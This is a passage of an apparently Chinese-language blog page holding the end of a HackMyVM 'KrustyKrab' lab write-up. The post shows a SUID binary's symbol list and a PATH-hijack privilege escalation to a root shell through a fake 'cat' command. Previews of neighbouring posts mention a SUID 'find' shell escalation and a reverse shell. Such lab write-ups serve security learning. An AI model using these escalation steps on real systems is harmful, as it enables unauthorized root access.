class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">_edata</span><br><span class="line">_fini</span><br><span class="line">system@GLIBC_2.2.5</span><br><span class="line">__data_start</span><br><span class="line">__gmon_start__</span><br><span class="line">__dso_handle</span><br><span class="line">_IO_stdin_used</span><br><span class="line">_end</span><br><span class="line">__bss_start</span><br><span class="line">main</span><br><span class="line">setgid@GLIBC_2.2.5</span><br><span class="line">__TMC_END__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">setuid@GLIBC_2.2.5</span><br><span class="line">__cxa_finalize@GLIBC_2.2.5</span><br><span class="line">_init</span><br><span class="line">.symtab</span><br><span class="line">.strtab</span><br><span class="line">.shstrtab</span><br><span class="line">.interp</span><br><span class="line">.note.gnu.property</span><br><span class="line">.note.gnu.build-id</span><br><span class="line">.note.ABI-tag</span><br><span class="line">.gnu.hash</span><br><span class="line">.dynsym</span><br><span class="line">.dynstr</span><br><span class="line">.gnu.version</span><br><span class="line">.gnu.version_r</span><br><span class="line">.rela.dyn</span><br><span class="line">.rela.plt</span><br><span class="line">.init</span><br><span class="line">.plt.got</span><br><span class="line">.text</span><br><span class="line">.fini</span><br><span class="line">.rodata</span><br><span class="line">.eh_frame_hdr</span><br><span class="line">.eh_frame</span><br><span class="line">.init_array</span><br><span class="line">.fini_array</span><br><span class="line">.dynamic</span><br><span class="line">.got.plt</span><br><span class="line">.data</span><br><span class="line">.bss</span><br><span class="line">.comment</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可执行文件执行</p>
+<p>cat &#x2F;etc&#x2F;shadow</p>
+<p>cat不是绝对路径调用可以进行路径劫持</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ echo bash &gt; cat</span><br><span class="line">$ ls</span><br><span class="line">cat  laststep</span><br><span class="line">$ chmod 777 cat           </span><br><span class="line">$ PATH=.:$PATH</span><br><span class="line">$ ./laststep</span><br><span class="line">root@KrustyKrab:~# </span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dgh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/05/29/hackmyvm-KrustyKrab/">http://example.com/2025/05/29/hackmyvm-KrustyKrab/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">myift</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/png.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/05/29/hackmyvm-reversteg/" title="hackmyvm_reversteg"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">hackmyvm_reversteg</div></div><div class="info-2"><div class="info-item-1"> 扫描  80的的源码发现 117db0148dc179a2c2245c5a30e63ab0 根据提示是一张图片 加上jpg即可 图片用随波逐流直接梭  morainelake为steghide密码 提取出的压缩包密码也是morainelake ┌──(root㉿kali)-[/myift/reversbeg]└─# steghide extract -sf 1.jpg --passphrase morainelake wrote extracted data to &quot;secret.zip&quot;.┌──(root㉿kali)-[/myift/reversbeg]└─# ls1.jpg  secret.zip┌──(root㉿kali)-[/myift/reversbeg]└─# unzip secret.zip Archive:  secret.zip   creating: secret/[secret.zip] secret/secret.txt password:  extracting: secret/secret.txt   ...</div></div></div></a><a class="pagination-related" href="/2025/05/29/hackmyvm-Principle/" title="hackmyvm_Principle"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">hackmyvm_Principle</div></div><div class="info-2"><div class="info-item-1">寻找存活靶机:   看一下web服务  简单的一个nginx欢迎页面 扫到robots.txt  三个路径分别去访问     按照提示去扫目录 扫到    得到子域名T4L0S.HMV 放入hosts文件 去访问  提示我们还有子域 枚举 ffuf -u http://t4l0s.hmv -H &#x27;Host: FUZZ.t4l0s.hmv&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 615   也加进hosts文件中  证明了我们方向是对的 接下来扫一下目录得到upload.php  改掉MIME类型即可上传根据返回包判断出文件路径 直接nc弹shell即可   suid find提权 find . -exec /bin/sh -p \; -quit     根据十二神的姓名查找文件 for line in $(cat name.txt); do find / -iname *$line* 2&gt;/dev/null;...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">dgh</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-todd/" title="hackmyvm_todd">hackmyvm_todd</a><time datetime="2025-05-29T13:29:17.000Z" title="发表于 2025-05-29 21:29:17">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Matrioshka/" title="hackmyvm_Matrioshka">hackmyvm_Matrioshka</a><time datetime="2025-05-29T13:29:07.000Z" title="发表于 2025-05-29 21:29:07">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-dc04/" title="hackmyvm_dc04">hackmyvm_dc04</a><time datetime="2025-05-29T13:28:50.000Z" title="发表于 2025-05-29 21:28:50">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-always/" title="hackmyvm_always">hackmyvm_always</a><time datetime="2025-05-29T13:28:35.000Z" title="发表于 2025-05-29 21:28:35">2025-05-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/05/29/hackmyvm-Principle/" title="hackmyvm_Principle">hackmyvm_Principle</a><time datetime="2025-05-29T13:28:25.000Z" title="发表于 2025-05-29 21:28:25">2025-05-29</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By dgh</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
